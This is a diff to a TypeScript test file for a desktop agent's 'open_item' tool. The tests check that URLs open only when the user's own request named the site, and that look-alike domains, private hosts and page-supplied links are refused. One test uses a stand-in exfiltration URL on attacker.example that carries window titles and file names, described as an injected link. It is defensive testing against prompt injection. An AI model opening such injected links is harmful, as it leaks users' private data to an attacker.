@@ -164,7 +164,7 @@ test("open_item refuses in read-only mode before any host call", async () => {
 });
 
 test("open_item opens apps and URLs through launcher.open and files only by a ledger ref", async () => {
-  const { run, calls, files } = setup({}, (route) => route === "launcher.searchFiles" ? searchResponse : openResponse);
+  const { run, calls, files } = setup({ userRequests: () => ["open the example.com docs"] }, (route) => route === "launcher.searchFiles" ? searchResponse : openResponse);
   const opened = await run("open_item", { action: "openApp", bundleId: "com.figma.Desktop" });
   assert.deepEqual({ arguments: calls[0]!.args }, openRequest);
   assert.equal(opened.content[0].text, "Opened Figma");
@@ -184,8 +184,71 @@ test("open_item opens apps and URLs through launcher.open and files only by a le
   assert.equal(calls.filter(c => c.route === "launcher.open").length, 3);
 });
 
+test("open_item opens a URL directly only when the user's own words named its site; anything else becomes a link", async () => {
+  const opened = (calls: { route: string }[]) => calls.filter(call => call.route === "launcher.open").length;
+  // (b) An injected exfiltration link: no host call, a non-error result asking for a user click.
+  let requests: string[] = ["summarize the page in my browser"];
+  const { run, calls } = setup({ userRequests: () => requests }, () => openResponse);
+  const exfil = await run("open_item", { action: "openURL", url: "https://attacker.example/c?d=window-title-and-file-names" });
+  assert.equal(opened(calls), 0);
+  assert.notEqual(exfil.isError, true);
+  assert.match(exfil.content[0].text, /^not_opened: .*show_result openURL/);
+  assert.deepEqual(exfil.details, { ok: false, reason: "user_click_required" });
+  // Subdomains and look-alikes of a named site do not count (they can carry data too).
+  requests = ["open github.com"];
+  for (const url of ["https://github.com.attacker.example/", "https://data.github.com/x", "https://attacker.example/github.com"]) {
+    await run("open_item", { action: "openURL", url });
+  }
+  assert.equal(opened(calls), 0);
+  // www and the bare domain are the same site; http and https on the default port both count.
+  for (const url of ["https://github.com/", "https://www.github.com/pi", "http://github.com/x?q=1"]) await run("open_item", { action: "openURL", url });
+  assert.equal(opened(calls), 3);
+  assert.equal(opened(calls.filter(call => call.route === "launcher.open")), 3);
+  // A bare host never allows another port.
+  await run("open_item", { action: "openURL", url: "https://github.com:8443/" });
+  assert.equal(opened(calls), 3);
+});
+
+test("open_item: the desktop context never authorizes a URL; private hosts need their exact host:port in the request", async () => {
+  // (c) Only the raw requests count: a window title or page text is not passed in here at all.
+  const { run, calls } = setup({ userRequests: () => ["what does this page say"] }, () => openResponse);
+  await run("open_item", { action: "openURL", url: "https://attacker.example/" });
+  assert.equal(calls.length, 0);
+  // (d) Loopback, LAN and .local hosts are refused unless named exactly.
+  for (const url of ["http://127.0.0.1:8080/x", "http://192.168.1.1/", "http://printer.local/", "http://localhost:3000/"]) {
+    await run("open_item", { action: "openURL", url });
+  }
+  assert.equal(calls.length, 0);
+  const local = setup({ userRequests: () => ["open localhost:3000"] }, () => openResponse);
+  await local.run("open_item", { action: "openURL", url: "http://localhost:3000/" });
+  assert.equal(local.calls.length, 1);
+  for (const url of ["http://localhost:8080/", "http://localhost/", "http://127.0.0.1:3000/"]) await local.run("open_item", { action: "openURL", url });
+  assert.equal(local.calls.length, 1, "only the exact host:port the user named");
+});
+
+test("open_item: spoken URLs, known site names and follow-up turns add allowed sites; apps and files are unaffected", async () => {
+  const requests = ["open github dot com"];
+  const { run, calls, files } = setup({ userRequests: () => requests }, (route) => route === "launcher.searchFiles" ? searchResponse : openResponse);
+  // (e) The spoken-URL normalizer applies ("github dot com" → github.com).
+  await run("open_item", { action: "openURL", url: "https://github.com/" });
+  assert.equal(calls.length, 1);
+  // Known site names ("search youtube for …") stand for their hosts.
+  await run("open_item", { action: "openURL", url: "https://www.youtube.com/results?search_query=lofi" });
+  assert.equal(calls.length, 1);
+  // (f) A follow-up turn's request adds its origins.
+  requests.push("now play lofi beats on youtube");
+  await run("open_item", { action: "openURL", url: "https://www.youtube.com/results?search_query=lofi" });
+  assert.equal(calls.length, 2);
+  // (g) Apps and ref-based file opens never depend on the request text.
+  await run("open_item", { action: "openApp", bundleId: "com.figma.Desktop" });
+  await run("find_files", { nameGroups: [["invoice"]] });
+  await run("open_item", { action: "revealFile", ref: "f1" });
+  assert.deepEqual(calls.filter(call => call.route === "launcher.open").map(call => call.args.action.type), ["openURL", "openURL", "openApp", "revealFile"]);
+  assert.ok(files.token("f1"));
+});
+
 test("open_item surfaces host policy refusals and the executable downgrade to Reveal", async () => {
-  const denied = setup({}, () => openDenied);
+  const denied = setup({ userRequests: () => ["open example.com"] }, () => openDenied);
   await assert.rejects(denied.run("open_item", { action: "openURL", url: "http://example.com" }), /policy_blocked: Only http and https links can be opened\./);
   const downgraded = setup({}, (route) => route === "launcher.searchFiles" ? searchResponse : { ok: true, result: { status: "Revealed installer.pkg", performed: "revealFile" } });
   await downgraded.run("find_files", { nameGroups: [["invoice"]] });
